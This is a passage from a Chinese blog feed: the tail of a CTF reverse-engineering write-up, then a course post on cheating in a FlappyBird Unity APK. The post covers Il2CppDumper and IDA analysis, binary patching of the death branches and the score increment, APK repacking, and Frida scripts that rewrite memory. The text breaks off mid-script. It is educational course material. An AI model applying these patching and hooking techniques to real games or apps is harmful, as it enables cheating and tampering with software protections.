class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec</span>(<span class="hljs-params">c1, c2</span>):<br>    i1 = table.index(c1) // <span class="hljs-number">8</span><br>    j1 = table.index(c1) % <span class="hljs-number">8</span><br>    i2 = table.index(c2) // <span class="hljs-number">8</span><br>    j2 = table.index(c2) % <span class="hljs-number">8</span><br>    <span class="hljs-keyword">if</span> (i1 == i2):<br>        indx1 = <span class="hljs-number">8</span> * i1 + (j1 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span><br>        indx2 = <span class="hljs-number">8</span> * i2 + (j2 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> (j1 == j2):<br>            indx1 = <span class="hljs-number">8</span> * ((i1 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>) + j1<br>            indx2 = <span class="hljs-number">8</span> * ((i2 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>) + j2<br>        <span class="hljs-keyword">else</span>:<br>            indx1 = <span class="hljs-number">8</span> * i1 + j2<br>            indx2 = <span class="hljs-number">8</span> * i2 + j1<br>    <span class="hljs-keyword">return</span> table[indx1]+table[indx2]<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ans), <span class="hljs-number">2</span>):<br>    flag += dec(ans[i], ans[i+<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(enc(flag[i], flag[i+<span class="hljs-number">1</span>]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(ans)<br><br></code></pre></td></tr></table></figure><p>跑一下得到下面的flag</p><p><code>6c324d2c86a72b864a2X2f30e46d202X20</code></p><p>算hash不对，根据前面补<code>X</code>的规则，把两个<code>X</code>去掉</p><p><img src="assets/2023-11-12-10-57-44-image.png"></p><p>ack，得到flag<code>flag&#123;6c324d2c86a72b864a22f30e46d20220&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf-wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>外挂实现分析-移动端</title>
    <link href="/2023/11/12/TencentGameClient/%E5%A4%96%E6%8C%82%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90-%E7%A7%BB%E5%8A%A8%E7%AB%AF/"/>
    <url>/2023/11/12/TencentGameClient/%E5%A4%96%E6%8C%82%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90-%E7%A7%BB%E5%8A%A8%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/noxke/TencentGameClientOpenCourse">GitHub - noxke&#x2F;TencentGameClientOpenCourse: 腾讯游戏客户端公开课2023 腾讯菁英班</a></p><h3 id="游戏分析"><a href="#游戏分析" class="headerlink" title="游戏分析"></a>游戏分析</h3><p>使用工具如下:</p><blockquote><p>root设备(nikel lineageos14 Android7.1.2)</p><p><a href="https://github.com/Perfare/Il2CppDumper">Il2CppDumper v6.7.40</a></p><p><a href="https://github.com/dnSpy/dnSpy">dnSpy v6.1.8</a></p><p><a href="https://hex-rays.com/IDA-pro/">IDA Pro 7.7</a></p><p><a href="https://bbs.binmt.cc/forum-2-1.html">mt文件管理器</a></p><p><a href="https://github.com/frida/frida">friad 16.1.4</a></p></blockquote><p>安装FlappyBird.apk进行测试</p><p><img src="assets/2023-10-28-22-29-44-image.png"></p><p>看来安卓版本太高还不让装，添加<code>android:exported=&#39;true&#39;</code>之后虽然能装上，但是启动黑屏，老老实实用低版本安卓分析算了</p><p>由于是Unity游戏，没必要分析Java层，直接查看libs文件价下的lib文件</p><p><img src="assets/2023-10-28-22-32-56-image.png"></p><p>看到<code>libil2cpp.so</code>文件，显然，这道题使用的是Unity il2cpp的方式，游戏逻辑在<code>libil2cpp.so</code>文件中，没有函数导出符号，分析难度较大。</p><p>从apk中提取处<code>libil2cpp.so</code>和<code>global-metadata.dat</code>，使用Il2CppDumper工具提取符号信息</p><p><img src="assets/2023-10-28-22-40-25-image.png"></p><p>提取得到的文件有<code>DummyDll</code>下的DLL文件，<code>il2cpp.h</code>结构体信息，<code>script.json</code>符号信息，<code>DummyDll</code>下的<code>Assembly-CSharp.dll</code>可以用dnSpy打开，分析C#类方法和成员，但是只有符号信息，没有方法实现</p><p>分析一下类名，可以知道玩家控制的逻辑在<code>PlayerController</code>类中实现，游戏控制和计分逻辑在<code>GameManager</code>类中实现</p><p><code>PlayerController</code>类中需要关注以下几个方法</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-comment">// Token: 0x0600002C RID: 44 RVA: 0x00002050 File Offset: 0x00000250</span><br>[<span class="hljs-meta">Token(Token = <span class="hljs-string">&quot;0x600001A&quot;</span>)</span>]<br>[<span class="hljs-meta">Address(RVA = <span class="hljs-string">&quot;0x5E23E4&quot;</span>, Offset = <span class="hljs-string">&quot;0x5E23E4&quot;</span>, VA = <span class="hljs-string">&quot;0x5E23E4&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Update</span>()</span><br>&#123;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x0600002D RID: 45 RVA: 0x00002050 File Offset: 0x00000250</span><br>[<span class="hljs-meta">Token(Token = <span class="hljs-string">&quot;0x600001B&quot;</span>)</span>]<br>[<span class="hljs-meta">Address(RVA = <span class="hljs-string">&quot;0x5E2788&quot;</span>, Offset = <span class="hljs-string">&quot;0x5E2788&quot;</span>, VA = <span class="hljs-string">&quot;0x5E2788&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">LateUpdate</span>()</span><br>&#123;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x0600002E RID: 46 RVA: 0x00002050 File Offset: 0x00000250</span><br>[<span class="hljs-meta">Token(Token = <span class="hljs-string">&quot;0x600001C&quot;</span>)</span>]<br>[<span class="hljs-meta">Address(RVA = <span class="hljs-string">&quot;0x5E2A70&quot;</span>, Offset = <span class="hljs-string">&quot;0x5E2A70&quot;</span>, VA = <span class="hljs-string">&quot;0x5E2A70&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnTriggerEnter2D</span>(<span class="hljs-params">Collider2D col</span>)</span><br>&#123;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x0600002F RID: 47 RVA: 0x00002050 File Offset: 0x00000250</span><br>[<span class="hljs-meta">Token(Token = <span class="hljs-string">&quot;0x600001D&quot;</span>)</span>]<br>[<span class="hljs-meta">Address(RVA = <span class="hljs-string">&quot;0x5E30C8&quot;</span>, Offset = <span class="hljs-string">&quot;0x5E30C8&quot;</span>, VA = <span class="hljs-string">&quot;0x5E30C8&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnCollisionEnter2D</span>(<span class="hljs-params">Collision2D col</span>)</span><br>&#123;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x06000030 RID: 48 RVA: 0x00002050 File Offset: 0x00000250</span><br>[<span class="hljs-meta">Token(Token = <span class="hljs-string">&quot;0x600001E&quot;</span>)</span>]<br>[<span class="hljs-meta">Address(RVA = <span class="hljs-string">&quot;0x5E2FAC&quot;</span>, Offset = <span class="hljs-string">&quot;0x5E2FAC&quot;</span>, VA = <span class="hljs-string">&quot;0x5E2FAC&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">KillPlayer</span>()</span><br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>GameManager</code>类中需要关注<code>UpdateScore</code>方法</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-comment">// GameManager</span><br><span class="hljs-comment">// Token: 0x06000006 RID: 6 RVA: 0x00002050 File Offset: 0x00000250</span><br>[<span class="hljs-meta">Token(Token = <span class="hljs-string">&quot;0x6000006&quot;</span>)</span>]<br>[<span class="hljs-meta">Address(RVA = <span class="hljs-string">&quot;0x5E09BC&quot;</span>, Offset = <span class="hljs-string">&quot;0x5E09BC&quot;</span>, VA = <span class="hljs-string">&quot;0x5E09BC&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">UpdateScore</span>()</span><br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述方法的实现都在<code>libil2cpp.so</code>文件中，下面使用ida32分析该文件</p><p>使用idapython加载<code>Il2CppDumper</code>的<code>ida_with_struct_py3.py</code>脚本，选择<code>script.json</code>和<code>il2cpp.h</code>文件，恢复函数名和结构体</p><ul><li><p><code>PlayerController__Update</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PlayerController__Update</span><span class="hljs-params">(PlayerController_o *<span class="hljs-keyword">this</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;fields.start )<br>    &#123;<br>        tiltSmooth = <span class="hljs-keyword">this</span>-&gt;fields.tiltSmooth;<br>        <span class="hljs-built_in">UnityEngine_Quaternion__Lerp</span>(&amp;v32, v33[<span class="hljs-number">0</span>], v28, tiltSmooth * deltaTime, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">UnityEngine_Transform__set_rotation</span>(transform, v32, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">UnityEngine_Transform__set_localPosition</span>(v16, v34, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">UnityEngine_Transform__set_rotation</span>(v17, v29, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要是设置旋转，设置位置</p></li><li><p><code>PlayerController__LateUpdate</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PlayerController__LateUpdate</span><span class="hljs-params">(PlayerController_o*<span class="hljs-keyword">this</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (Instance-&gt;fields.start &amp;&amp; <span class="hljs-built_in">UnityEngine_Input__GetMouseButtonDown</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>        <span class="hljs-built_in">UnityEngine_Rigidbody2D__set_gravityScale</span>(<span class="hljs-keyword">this</span>-&gt;fields.playerRigid, <span class="hljs-number">1.0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">this</span>-&gt;fields.tiltSmooth = <span class="hljs-keyword">this</span>-&gt;fields.minTiltSmooth;<br>        <span class="hljs-built_in">UnityEngine_Transform__set_rotation</span>(transform, <span class="hljs-keyword">this</span>-&gt;fields.upRotation, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">UnityEngine_Vector2__get_zero</span>(&amp;value, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">UnityEngine_Rigidbody2D__set_velocity</span>(playerRigid, value, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">UnityEngine_Vector2__get_up</span>(&amp;v11, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">UnityEngine_Vector2__op_Multiply_2987556</span>(&amp;force, v11, <span class="hljs-keyword">this</span>-&gt;fields.thrust, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">UnityEngine_Rigidbody2D__AddForce</span>(v7, force, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">UnityEngine_Rigidbody2D__get_velocity</span>(&amp;value, <span class="hljs-keyword">this</span>-&gt;fields.playerRigid, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (value.fields.y &lt; <span class="hljs-number">-1.0</span>)<br>    &#123;<br>        <span class="hljs-keyword">this</span>-&gt;fields.tiltSmooth = <span class="hljs-keyword">this</span>-&gt;fields.maxTiltSmooth;<br>        <span class="hljs-built_in">UnityEngine_Rigidbody2D__set_gravityScale</span>(v9, <span class="hljs-number">2.0</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数的内容相对就多一些类，但是根据函数名很容易分析出功能，主要是两个if内的内容，第一个if当屏幕被点击时进入，把小鸟的刚体组件重力影响<code>gravityScale</code>修改为1.0，将刚体组件的速度向量<code>velocity</code>设置为0，为刚体组件施加一个y反向的力，大小为<code>this-&gt;fields.thrust</code>，该部分的目的是让小鸟有一个向上的速度；第二个if先判断向下的速度，当向下速度小于1.0时增大刚体的重力影响</p></li><li><p><code>PlayerController__OnTriggerEnter2D</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PlayerController__OnTriggerEnter2D</span><span class="hljs-params">(PlayerController_o*<span class="hljs-keyword">this</span>, UnityEngine_Collider2D_o* col)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UnityEngine_Component__CompareTag</span>(transform, (System_String_o*)StringLiteral_3006, <span class="hljs-number">0</span>))<br>    &#123;<br>        <span class="hljs-built_in">GameManager__UpdateScore</span>(GameManager_TypeInfo-&gt;static_fields-&gt;Instance, v7);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UnityEngine_Component__CompareTag</span>(v8, (System_String_o*)StringLiteral_3014, <span class="hljs-number">0</span>))<br>        &#123;<br>            <span class="hljs-built_in">PlayerController__KillPlayer</span>(<span class="hljs-keyword">this</span>, v29);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里主要是两个<code>CompareTag</code>，第一个<code>CompareTag</code>比较进入的物体是否为<code>Score</code>，如果是<code>Score</code>则调用<code>GameManager__UpdateScore</code>更新游戏分数，第二个<code>CompareTag</code>比较进入的物体是否为<code>Obstacle</code>，如果是<code>Obstacle</code>则调用<code>PlayerController__KillPlayer</code>触发死亡</p></li><li><p><code>PlayerController__OnCollisionEnter2D</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PlayerController__OnCollisionEnter2D</span><span class="hljs-params">(PlayerController_o*<span class="hljs-keyword">this</span>, UnityEngine_Collision2D_o* col,)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UnityEngine_Component__CompareTag</span>(transform, (System_String_o*)StringLiteral_3015, <span class="hljs-number">0</span>))<br>    &#123;<br>        <span class="hljs-built_in">PlayerController__KillPlayer</span>(<span class="hljs-keyword">this</span>, v6);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只有一个<code>CompareTag</code>，比较碰撞的物体是否为<code>Ground</code>，是<code>Ground</code>则调用<code>PlayerController__KillPlayer</code>触发死亡</p></li><li><p><code>PlayerController__KillPlayer</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> __fastcall <span class="hljs-title">PlayerController__KillPlayer</span><span class="hljs-params">(PlayerController_o *<span class="hljs-keyword">this</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">GameManager__EndGame</span>(GameManager_TypeInfo-&gt;static_fields-&gt;Instance, method);<br>    <span class="hljs-built_in">UnityEngine_Vector2__get_zero</span>(&amp;v5, <span class="hljs-number">0</span>);    <br>    <span class="hljs-built_in">UnityEngine_Rigidbody2D__set_velocity</span>(playerRigid, v5, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>GameManager__EndGame</code>结束游戏，将小鸟刚体速度向量设置为0</p></li><li><p><code>GameManager__UpdateScore</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GameManager__UpdateScore</span><span class="hljs-params">(GameManager_o *<span class="hljs-keyword">this</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    gameScoreText = <span class="hljs-keyword">this</span>-&gt;fields.gameScoreText;<br>    v4 = <span class="hljs-keyword">this</span>-&gt;fields.gameScore + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">this</span>-&gt;fields.gameScore = v4;<br>    <span class="hljs-built_in">SoundManager__PlayTheAudio</span>(SoundManager_TypeInfo-&gt;static_fields-&gt;Instance, (System_String_o*)StringLiteral_3005, v8);<br>&#125;<br></code></pre></td></tr></table></figure><p>分数+1，刷新分数显示，播放音乐</p></li></ul><h4 id="Patch二进制文件破解"><a href="#Patch二进制文件破解" class="headerlink" title="Patch二进制文件破解"></a>Patch二进制文件破解</h4><p>在上面分析里面可以知道有两个<code>CompareTag</code>分支会触发死亡，只要Patch掉这两个分支，就可以轻松实现无敌效果，至于能不能关闭小鸟与管道的碰撞，可以猜测管道属于<code>Obstacle</code>，地面属于<code>Ground</code>，因此小鸟可以穿过管道，但是不会穿过地面</p><p>汇编界面查看这两个分支</p><img src="assets/2023-10-28-23-39-22-image.png" title="" alt="" width="522"><p>这里是<code>PlayerController__OnTriggerEnter2D</code>的死亡分支，比较进入的物体是否为<code>Obstacle</code>，当比较结果不为1时调整到函数末尾返回，否则进入后续代码触发死亡，将BNE修改为B指令即可</p><img src="assets/2023-10-28-23-43-09-image.png" title="" alt="" width="525"><p>继续查看<code>PlayerController__OnCollisionEnter2D</code>中的<code>CompareTag</code>分支，与上面的情况类似，将BNE修改为B指令</p><img src="assets/2023-10-28-23-45-02-image.png" title="" alt="" width="526"><p>分数的更新在<code>GameManager__UpdateScore</code>中，将分数加一进行修改即可实现修改游戏分数，修改如下，将加一修改为加0xFF</p><img title="" src="assets/2023-10-28-23-50-33-image.png" alt="" width="523"><p>保存修改并上传到手机</p><p><img src="assets/2023-10-28-23-52-41-image.png"></p><p>使用mt文件管理器将修改后的libil2cpp.so添加到apk中重新打包签名</p><img src="assets/2023-10-28-23-54-55-image.png" title="" alt="" width="246"><p>安装测试</p><img title="" src="assets/2023-10-28-23-56-45-image.png" alt="" width="241"><p>无论是碰撞地面还是管道，都不会死亡，并且一次得分为255分，游戏破解完成</p><h4 id="frida一把梭"><a href="#frida一把梭" class="headerlink" title="frida一把梭"></a>frida一把梭</h4><p>将frida-server上传到手机，编写python脚本附加到游戏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    device = frida.get_usb_device()<br>    app = device.get_frontmost_application()<br>    process = device.attach(app.pid)<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">True</span>):<br>        jscode = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[0] : 退出&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[1] : 开启无敌&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[2] : 关闭无敌&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[3] : 开启飞行&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[4] : 关闭飞行&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[5] : 加分数&quot;</span>)<br>        <span class="hljs-comment"># print(&quot;[9] : hook测试&quot;)</span><br>        choice = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>))<br>        <span class="hljs-keyword">match</span> choice:<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                jscode = invincible_js<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                jscode = off_invincible_js<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                jscode = fly_js<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                jscode = off_fly_js<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                jscode = add_score_js<br>            <span class="hljs-comment"># case 9:</span><br>            <span class="hljs-comment">#     jscode = hook_js</span><br>            <span class="hljs-keyword">case</span> _:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;输入错误&quot;</span>)<br>        script = process.create_script(jscode)<br>        script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br>        script.load()<br><br>    process.detach()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>实现的功能有无敌、飞行和加分数，下面分别分析frida脚本内容</p><ul><li><p>开启无敌</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> libil2cpp = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&quot;libil2cpp.so&quot;</span>);<br>    <span class="hljs-comment">// OnTriggerEnter2D</span><br>    <span class="hljs-keyword">var</span> offset1 = <span class="hljs-number">0x5E2BCC</span>;<br>    <span class="hljs-keyword">var</span> addr1 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset1);<br>    <span class="hljs-keyword">var</span> arr1 = [<span class="hljs-number">0xE5</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xEA</span>]; <span class="hljs-comment">// B 0x5E2F68</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr1, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr1, arr1);<br>    <span class="hljs-comment">// OnCollisionEnter2D</span><br>    <span class="hljs-keyword">var</span> offset2 = <span class="hljs-number">0x5E30CC</span>;<br>    <span class="hljs-keyword">var</span> addr2 = libil2cpp.<span class="hljs-property">base</span>.<span class="hljs-title function_">add</span>(offset2);<br>    <span class="hljs-keyword">var</span> arr2 = [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xEA</span>]; <span class="hljs-comment">// B 0x5E31D4</span><br>    <span class="hljs-comment">// 修改内存保护</span><br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(addr2, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>    <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(addr2, arr2);<br>&#125;);<br></code></pre></td></tr></table></figure><p>其实就是对内存中<code>CompareTag</code>的分支进行修改，将BNE修改为B指令，需要注意的是地址需要用基地址+相对偏移的方式得到，修改前需要修改段保护权限</p></li><li><p>关闭无敌</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> libil2cpp = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&quot;libil2cpp.so&quot;</span>);<br>    <span class="hljs-comment">// OnTriggerEnter2D</span><br>    <span class="hljs-keyword">var</span> offset1 = <span class="hljs-number">0x5E2BCC</span>;<br>    